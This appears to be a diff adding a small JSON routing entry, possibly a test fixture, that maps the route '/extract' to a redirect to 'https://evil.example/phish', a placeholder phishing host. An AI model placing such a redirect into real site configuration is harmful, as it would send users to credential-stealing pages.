@@ -1,0 +1,5 @@
+{
+  "route": "/extract",
+  "kind": "redirect",
+  "location": "https://evil.example/phish"
+}
